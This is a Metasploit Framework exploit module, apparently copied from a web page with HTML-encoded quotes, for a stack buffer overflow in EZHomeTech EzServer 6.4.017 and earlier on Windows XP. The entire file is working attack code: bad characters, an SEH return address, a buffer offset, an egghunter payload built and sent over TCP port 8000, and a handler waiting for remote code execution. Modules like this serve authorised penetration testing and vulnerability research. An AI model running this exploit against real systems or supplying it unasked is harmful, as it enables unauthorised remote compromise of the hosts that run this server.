# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Egghunter
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;EZHomeTech EzServer <= 6.4.017 Stack Buffer Overflow Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack buffer overflow in the EZHomeTech EZServer. If a malicious
                user sends packets containing an overly long string, it may be possible to execute a
                payload remotely. Due to size constraints, this module uses the Egghunter technique.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;modpr0be<modpr0be[at]spentera.com>&#039; # Original discovery and Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;19266&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.spentera.com/2012/06/ezhometech-ezserver-6-4-017-stack-overflow-vulnerability/&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;seh&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20\x2e\x2f\x3a",
                    &#039;DisableNops&#039; => true
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;EzHomeTech EzServer <= 6.4.017 (Windows XP Universal)&#039;,
                        {
                            &#039;Ret&#039; => 0x10212779, # pop ecx # pop ebx # ret 4 - msvcrtd.dll
                            &#039;Offset&#039; =>  5852
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jun 18 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options([Opt::RPORT(8000)], self.class)
 
    end
 
    def exploit
        connect
        eggoptions =
        {
            :checksum => true,
            :eggtag => "w00t"
        }
 
        hunter = generate_egghunter(payload.encoded,payload_badchars,eggoptions)
        egg = hunter[1]
        buff = rand_text(target[&#039;Offset&#039;] - egg.length) #junk
        buff << egg
        buff << make_nops(32)
        buff << generate_seh_record(target.ret)
        buff << make_nops(16)
        buff << hunter[0]
        buff << rand_text_alpha_upper(500)
 
        print_status("Triggering shellcode now...")
        print_status("Please be patient, the egghunter may take a while..")
 
        sock.put(buff)
 
        handler
        disconnect
 
    end
end



